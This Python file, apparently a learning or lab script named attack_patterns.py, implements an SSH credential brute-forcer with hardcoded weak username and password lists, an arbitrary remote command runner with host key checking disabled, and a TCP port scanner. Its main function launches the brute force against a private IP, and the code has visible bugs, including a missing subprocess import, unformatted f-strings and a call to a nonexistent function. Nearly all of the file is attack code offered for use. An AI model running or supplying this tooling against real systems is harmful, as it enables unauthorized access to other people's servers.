# scripts/attack_patterns.py

import paramiko 
import socket
from colorama import Fore


### Brute force ssh credentials
def brute_force_attack(target_ip, target_port, username_list, password_list):
        for username in username_list:
            for password in password_list:
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(target_ip, port=target_port, username=username, password=password)    
                    print(f"{Fore.GREEN}[SUCCESS] {Fore.RESET}Successful login: {username}:{password}")
                    ssh_client.close()
                except paramiko.AuthenticationException:
                    print(f"{Fore.RED}[FAILED]{Fore.RESET} Authentication failed for {username}:{password}")
                except paramiko.SSHException as e:
                    print(f"{Fore.RED}[ERROR]{Fore.RESET} SSH error: {e}")


### Execute command when inside ssh
def execute_ssh_command(target_ip, port, username, password, command):
    # Construir el comando SSH con la información proporcionada
    ssh_command = f'ssh -p {port} -o StrictHostKeyChecking=no {username}@{target_ip} "{command}"'

    # Ejecutar el comando SSH
    try:
        # Abrir una subproceso con el comando SSH
        ssh_process = subprocess.Popen(ssh_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Proporcionar la contraseña a través de la entrada estándar
        ssh_process.stdin.write(password)
        
        # Leer la salida y la salida de error del proceso SSH
        output, error_output = ssh_process.communicate()

        # Imprimir la salida del comando
        if output:
            print("{Fore.GREEN}[SUCCESS]{Fore.RESET} Output:")
            print(output)
        
        # Imprimir la salida de error si la hay
        if error_output:
            print("{Fore.RED}[ERROR]:{Fore.RESET}")
            print(error_output)
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} executing SSH command: {e}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]:{Fore.RESET} {e}")

### Scan open ports
def port_scan(target_ip):
    open_ports = []
    try:
        for port in range(1, 1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)  # Establece un tiempo de espera para la conexión
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"{Fore.GREEN}[OPEN]{Fore.RESET} Port {Fore.BLUE}{port}{Fore.RESET} is open.")
            sock.close()
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} Error while scanning ports: {e}")
    return open_ports

def main():
	ul = ["user1", "admin", "user", "user2", "user3"]
	pl = ["password","12345678", "admin", "password123", "password1234"]
	brute_force_attack("172.18.0.2", "22", ul, pl)
	#port_scan("192.168.1.41")
	#execute_command("192.168.1.41", "22", "user", "password", "echo 'hola'")

if __name__ == "__main__":
    main()

